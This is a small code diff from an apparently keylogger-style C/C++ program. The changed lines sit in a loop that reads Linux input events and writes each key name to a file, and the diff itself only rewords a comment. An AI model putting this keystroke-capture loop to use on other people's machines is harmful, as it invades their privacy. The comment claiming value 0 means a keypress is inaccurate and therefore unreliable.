@@ -138,7 +138,7 @@ int main(){
 
     while(true){
         read(in, &ev, sizeof(ev)); //read event file to event structure
-        if((ev.type == EV_KEY) && (ev.value == 0)){ //EV_KEY means keyboard and a 0 value is a keypress
+        if((ev.type == EV_KEY) && (ev.value == 0)){ //EV_KEY means key (button) and a 0 value is a single keypress
             out << keycodes[ev.code] << endl; //print to file
         }
    }
